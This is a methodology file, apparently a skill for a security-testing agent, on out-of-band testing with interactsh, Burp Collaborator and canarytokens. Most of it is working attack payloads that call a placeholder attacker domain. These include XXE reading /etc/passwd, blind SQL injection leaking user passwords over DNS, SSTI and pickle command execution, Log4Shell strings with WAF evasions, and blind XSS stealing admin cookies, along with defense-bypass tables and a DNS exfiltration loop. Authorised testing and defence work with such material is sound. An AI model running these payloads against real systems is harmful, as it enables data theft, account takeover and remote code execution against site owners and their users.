---
name: oast_out_of_band
category: methodology
description: Out-of-band application security testing (OAST) workflow — interactsh / Burp Collaborator / canarytokens setup, per-attack-class payload templates for SSRF, XXE, blind SQLi, blind RCE, blind SSTI, blind deserialization, Log4Shell, blind XSS, HTTP smuggling confirmation, data exfiltration via DNS, and detection logic
depends_on: []
---

# Out-of-Band Application Security Testing (OAST)

Many vulnerability classes don't reflect output to the attacker — blind SSRF,
blind SQLi, blind deserialization, blind RCE. The target server DOES act on
your input; you just can't see the result directly. OAST solves this: you
trigger the vulnerability on the target, and the target makes an
**outbound callback** to infrastructure you control. The callback itself is
the confirmation (and often the exfiltration channel).

## When to Use

- Input reaches a URL / hostname / file / command sink but output isn't reflected
- Response is identical for vulnerable and non-vulnerable inputs
- Testing webhook endpoints that fetch URLs
- Testing image / URL preview / OAuth callback ingestion
- Testing mail-sending features (header injection, `Bcc:` smuggling)
- Testing JNDI / Log4Shell / Spring4Shell classes
- Detecting HTTP smuggling via downstream request hijacking
- Exfiltrating data when direct-response channels are blocked

## The OAST Infrastructure

Three options, cheapest first:

### 1. interactsh (free, self-hosted or public instance)

```bash
# Install — single Go binary
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Start client against ProjectDiscovery's public server
interactsh-client -v
# output:
# [INF] New interactsh client (hash: 7cc...)
# [INF] Interactsh public: oastxxxxxxxxxx.oast.pro
# [INF] Listing from: oast.pro, oast.live, oast.site, oast.online, oast.fun, oast.me

# Each callback is printed live. Your OAST domain: oastxxxxxxxxxx.oast.pro
# Any DNS or HTTP hit to *.oastxxxxxxxxxx.oast.pro prints here.

# Self-hosted — if program doesn't allow public oast servers:
# Deploy interactsh-server on a VPS with its own domain
interactsh-server -d example.com -token mysecret
# Then use: oastxxxxxxxxxx.example.com
```

### 2. Burp Collaborator (paid, but premium features)

```
Burp Suite Pro → Project Options → Project Options → Misc → Burp Collaborator server
# → Poll via Burp Intruder, or manually Copy-Collaborator-URL
```

Collaborator is the gold standard — polling is automatic, the UI correlates
hits to requests, and the payloads-generator has Collaborator URL integrated.

### 3. canarytokens (free, hosted, easy)

```
Browse to https://canarytokens.org/generate
Generate an HTTP / DNS / fast-redirect token
Use the token's URL/domain in your payload
You get an email alert when triggered
```

Good for one-shot tests; worse for long hunts than interactsh/Collaborator.

### 4. DNSlog.cn (free, hosted, Chinese infrastructure)

Browse `dnslog.cn`, get a subdomain, poll for hits. Some programs forbid foreign OAST infra -- check scope.

## Per-Attack-Class Payloads

All examples use `$OAST` as the attacker-controlled domain (e.g.
`oastxxxxxxxxxx.oast.pro`).

### Blind SSRF

```bash
# Direct URL parameter
curl "https://target.com/api/fetch?url=http://$OAST/ssrf-path"

# URL in body
curl -X POST https://target.com/api/preview \
  -H "Content-Type: application/json" \
  -d "{\"url\": \"http://$OAST\"}"

# Image fetch
curl -X POST https://target.com/api/profile/avatar \
  -H "Authorization: Bearer $TOK" \
  -d "{\"avatar_url\": \"http://$OAST/me.jpg\"}"

# OAuth callback (testing state / redirect_uri handling)
# https://target.com/oauth/authorize?client_id=...&redirect_uri=http://$OAST/cb

# Webhook receiver
curl -X POST https://target.com/api/webhooks -d '{"callback": "http://'$OAST'"}'

# DNS rebinding for internal services (after confirming basic SSRF)
# Register a domain that resolves to 1.2.3.4 first request, 169.254.169.254 second:
# Use `rbndr.us` or `lock.cmpxchg8b.com` style public rebind services
```

**What you see on OAST**: HTTP hit → the server actually fetched. DNS hit
without HTTP → DNS resolved but connection blocked (filter at network layer).

### XXE (XML External Entity)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://$OAST/xxe">
  %xxe;
]>
<foo>bar</foo>
```

Data exfiltration via out-of-band XXE:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://$OAST/evil.dtd">
  %dtd;
]>
<data>&send;</data>
```

Where `evil.dtd` (hosted on your OAST or server) contains:
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://$OAST/?%file;'>">
%all;
```

Each hit logs `/etc/passwd` content as the URL path.

### Blind SQL Injection — DNS exfiltration

```sql
-- MySQL
' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.$OAST\\a')))-- -

-- MSSQL
'; EXEC master..xp_dirtree '\\\\'+(SELECT TOP 1 password FROM users)+'.$OAST\\a'--

-- Oracle
' AND (SELECT UTL_HTTP.REQUEST('http://'||(SELECT password FROM users WHERE rownum=1)||'.$OAST/x') FROM DUAL)--

-- PostgreSQL
'; COPY (SELECT password FROM users LIMIT 1) TO PROGRAM 'curl http://$OAST/$(cat -)'--
```

Every DNS hit has the sensitive data as the subdomain.

### Blind RCE via DNS

```bash
# Wrap any command to exfil its output via DNS
curl "https://target.com/api/?cmd=\$(id);\$(curl http://\$(id).$OAST)"

# Unix DNS exfil — no curl needed
nslookup `id`.$OAST

# Windows DNS exfil
ping -n 1 %COMPUTERNAME%.$OAST
nslookup %USERNAME%.$OAST
```

### Blind SSTI

```
# Jinja2 (Flask)
{{ lipsum.__globals__.os.popen('curl http://$OAST/$(id)').read() }}

# Twig (PHP)
{{ ['curl http://$OAST'] | map('system') | join }}

# Freemarker (Java)
<#assign x="freemarker.template.utility.Execute"?new()>${x("curl http://$OAST")}

# ERB (Ruby)
<%= `curl http://$OAST` %>

# EJS (Node)
<%= require('child_process').execSync('curl http://$OAST') %>
```

### Blind Deserialization

```bash
# Java URLDNS — pure DNS, no RCE needed, confirms deserialization is live
java -jar ysoserial.jar URLDNS "http://$OAST/java-deser" | base64 -w0
# → paste into the base64-looking cookie / header

# PHP — phpggc confirmation gadget
phpggc Monolog/RCE6 'curl http://$OAST/php-deser'

# Python pickle
python3 -c "
import pickle, base64, os
class X:
    def __reduce__(self):
        return (os.system, ('curl http://$OAST/py-pickle',))
print(base64.b64encode(pickle.dumps(X())).decode())"
```

### Log4Shell (CVE-2021-44228) + JNDI

```
${jndi:ldap://$OAST/a}
${jndi:rmi://$OAST/a}
${jndi:dns://$OAST/a}

# Evasions for WAF rules
${${::-j}ndi:ldap://$OAST/a}
${${lower:jndi}:ldap://$OAST/a}
${jndi:${lower:ldap}://$OAST/a}

# Where to inject — ANY user-controlled string reaching Log4j. Try:
# - User-Agent
# - Referer
# - X-Forwarded-For
# - Authorization
# - Cookie
# - Request body
# - Filename in upload
# - Search query
# - User's display name in profile (persistent!)
```

### Blind XSS

Blind XSS pays off when victim is an admin viewing user-submitted data hours
later.

```html
<!-- Place in every input that admins may view (support tickets, reviews,
     user-agent field in logs, contact forms) -->
<script>fetch('http://$OAST/blind-xss?c='+encodeURIComponent(document.cookie+'|'+location))</script>

<!-- Stealth — loads on image parse failure -->
<img src=x onerror="fetch('http://$OAST/?c='+btoa(document.cookie))">

<!-- Escapes CSP via image/link -->
<img src="http://$OAST/xss.png?cookie=stolen">

<!-- Polyglot that works in most contexts -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=fetch('http://$OAST')//>\x3e
```

### Blind XXE via SVG

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://$OAST/svg-xxe">]>
<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">&xxe;</text>
</svg>
```

Upload as `avatar.svg`.

### HTTP Smuggling Confirmation

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 77

0

GET /?smuggle HTTP/1.1
Host: $OAST
X:
```

If `$OAST` receives a hit → front-end is forwarding the desynced request.

### Header Injection → Email Bcc

```http
POST /api/contact HTTP/1.1
Host: target.com
Content-Type: application/json

{"email": "victim@example.com\r\nBcc: leak@$OAST", "message": "hi"}
```

Email server delivers bcc to your OAST domain (if MX record on $OAST resolves
to a server that captures mail — some interactsh instances include SMTP).

## Data Exfiltration via DNS

DNS constraints: max 63 chars/label, 253 chars/FQDN, alphanumeric+hyphens only. For long data, chunk into 50-char base64 labels: `DATA=$(cat /etc/passwd | base64 -w0 | tr '+/=' '-_0'); for i in $(seq 0 50 ${#DATA}); do nslookup ${DATA:$i:50}.${i}.$OAST; done`. Reassemble by sorting labels by offset and decoding.

## Technique Matrix

| # | Technique | Attack Class | Detection Method |
|---|-----------|-------------|-----------------|
| 1 | Blind XSS canary blanketing | Stored XSS in admin panels | Seed XSSHunter payloads in every user field; wait for internal-tool callback (Report #1103298: Shopify Parquet Viewer, Report #984840704: $313K Google internal dashboard) |
| 2 | Cross-pipeline canary | Stored XSS via data warehouse | Payload survives ETL: form field -> DB -> Parquet -> internal viewer (Report #1103298) |
| 3 | Parameter-name-driven payload | Multiple blind classes | Read param name as sink hint: `url`=SSRF, `template`=SSTI, `query`=SQLi (Report #1071524) |
| 4 | OOB DNS as universal SSRF detector | Blind SSRF | Catalog every URL-accepting input; DNS hit without HTTP = network-layer filter (Report #1006599) |
| 5 | Binary file metadata canary | XXE via media upload | Embed XML entity in WAV/DOCX/XLSX metadata (Report #1095645: WordPress XXE via WAV iXML) |
| 6 | Gravity well targeting | Blind XSS | Support tickets, refund disputes, abuse reports -- always reviewed by staff (Report #1017189, Report #1028820) |
| 7 | Filter-passthrough oracle | Blind injection | Field-restricted endpoints with structured queries leak data via OOB (Report #1130874) |
| 8 | Redirect-param scheme injection | Blind XSS/SSRF | `javascript:`, `data:`, `vbscript:` in redirect/callback/return params (Report #1058427) |

## Defense-Bypass Pairs

| Defense | Bypass | Example |
|---------|--------|---------|
| CSP blocking inline scripts | Image/link exfil: `<img src="http://$OAST/xss.png?cookie=stolen">` | CSP allows images; cookie exfil via src attribute |
| WAF blocking `<script>` | SVG onload: `<svg onload="fetch('http://$OAST')">` | SVG in upload or injection context |
| XML entity disabled (libxml2) | Binary container embedding (WAV iXML, DOCX) | WAF doesn't inspect binary file metadata (Report #1095645) |
| Output encoding on web tier | Cross-pipeline: data warehouse viewer has no encoding | Internal tool built by different team (Report #1103298) |
| SSRF blocklist on URL parameter | DNS-only exfil via `nslookup data.$OAST` | DNS resolves even when HTTP is blocked |
| Collaborator/interactsh domain blocked | Self-hosted interactsh on own domain | Program scope may restrict public OOB infra |
| No JavaScript execution context | `<img src=x onerror=...>` or CSS `url()` exfil | Event handlers and CSS don't need script context |
| Rate limiting on callback URL | Unique subdomain per payload: `field1.$OAST`, `field2.$OAST` | Each payload has its own DNS label |

## Chain Patterns

| Chain | Step 1 | Step 2 | Impact |
|-------|--------|--------|--------|
| Blind XSS -> admin ATO | Canary fires in admin panel | Exfil admin session cookie via callback | Full admin access ($313K -- Report #984840704) |
| XXE via media -> SSRF -> RCE | Upload WAV with XML entity | Entity resolves to `phar://` or internal service | RCE via deserialization chain (Report #1095645) |
| Blind XSS -> internal tool discovery | Callback reveals `file://` or `intranet.` URL | Map internal infrastructure from DOM screenshot | Internal network mapping (Report #1103298) |
| OOB DNS -> SSRF confirmation -> port scan | DNS hit confirms outbound reach | Iterate ports via redirector | Internal service enumeration |
| Blind SQLi -> DNS exfil -> full dump | Boolean oracle too slow | Switch to DNS-label exfil for bulk data | Database exfiltration via DNS |
| Log4Shell -> JNDI callback -> RCE | Inject `${jndi:ldap://$OAST/a}` in any header | Callback confirms log4j parsing | Remote code execution |
| HTTP smuggling -> OOB confirmation | TE desync payload | Smuggled request hits `$OAST` host | Smuggling confirmed + victim request capture |
| Blind SSTI -> OOB exfil | Template expression executes | `curl http://$OAST/$(id)` in template | Command execution confirmed |

## Pro Tips from Corpus

1. **Blanket blindly, identify later.** Seed unique payloads in EVERY field -- name, bio, address, support tickets, reviews, dispute messages, refund reasons. Wait days/weeks for callbacks. Identify which field from the unique subdomain label (Report #1121900, Report #1103298).
2. **Target gravity wells.** Support tickets, abuse reports, refund disputes, KYC fields -- these are ALWAYS reviewed by humans with elevated privileges (Report #1017189, Report #1028820).
3. **Capture more than cookies.** Design XSSHunter payloads to grab: `document.cookie`, `location.href`, `document.body.innerHTML`, `localStorage`, and a DOM screenshot. The DOM reveals admin capabilities (Report #1051369).
4. **Internal-tool URLs are gold.** `file://`, `localhost:`, `intranet.`, `admin.` in callback metadata indicate internal tool execution -- highest-value blind XSS targets (Report #1103298).
5. **Read param names as sink hints.** `url`/`redirect`/`callback` = SSRF, `template`/`page` = SSTI/LFI, `query`/`search` = SQLi, `name`/`title` = XSS reflection (Report #1071524).
6. **Binary files bypass WAF.** XML embedded in WAV/DOCX/SVG files is invisible to request-body WAF rules (Report #1095645).
7. **DNS-only exfil when HTTP is blocked.** Even aggressive firewalls allow DNS. Use `nslookup data.$OAST` as the universal fallback channel.
8. **Self-host when programs block public OOB.** Deploy interactsh-server on a VPS with your own domain. Some programs explicitly forbid oast.pro/collaborator but allow self-hosted infra.